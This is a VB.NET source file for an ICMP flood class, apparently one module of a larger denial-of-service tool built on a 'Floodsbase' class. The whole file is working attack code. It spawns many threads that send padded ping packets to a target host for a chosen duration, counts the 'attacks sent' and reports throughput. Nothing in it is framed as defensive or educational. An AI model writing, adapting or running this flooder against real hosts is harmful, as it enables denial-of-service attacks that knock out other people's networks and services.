Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation
Class ICMP : Inherits Floodsbase
    Private _ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private Attacks As Integer = 0
    Private Threadsto As Integer
    Private Length As Integer

    Public Sub New(ByVal model As ICMPModel)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = model.Host
            ThreadstoUse = model.ThreadstoUse
            TimetoAttack = model.Time
            Threadsto = model.ThreadstoUse
            Length = model.Length
            Threads = New Thread(Threadsto - 1) {}
            SetMessage("ICMP Flood started!")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next
        Else
            SetMessage("A ICMP Attack is Already Running on " & HostToAttack)
        End If
    End Sub

    Private Sub Ended()
        _ThreadsEnded = _ThreadsEnded + 1
        If _ThreadsEnded = ThreadstoUse Then
            _ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            SetMessage("ICMP Attack on " & HostToAttack & " finished successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        End If
    End Sub

    Public Sub Stoped()
        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            SetMessage("ICMP Attack on " & HostToAttack & " aborted successfully. Attacks Sent: " & Attacks.ToString)
            Attacks = 0

        Else
            SetMessage("No Condis Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()
        Try

            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim Data As String = "a"
            For i = 0 To Length
                Data += "a"
            Next
            Do While (stopwatch.Elapsed < span)
                Try
                    My.Computer.Network.Ping(HostToAttack)
                    Dim pingSender As Ping = New Ping()
                    'Dim address As IPAddress = IPAddress.Loopback
                    Dim buffer As Byte() = Encoding.ASCII.GetBytes(Data)
                    Dim Timeout As Integer = 10000
                    Dim reply As PingReply = pingSender.Send(HostToAttack, Timeout, buffer)
                    Attacks = Attacks + 1
                    Set_AttackStrengOnByte(Attacks * Length)
                    GetAttackStrengOnByteOnSec(stopwatch)
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try
        Ended()
    End Sub
End Class
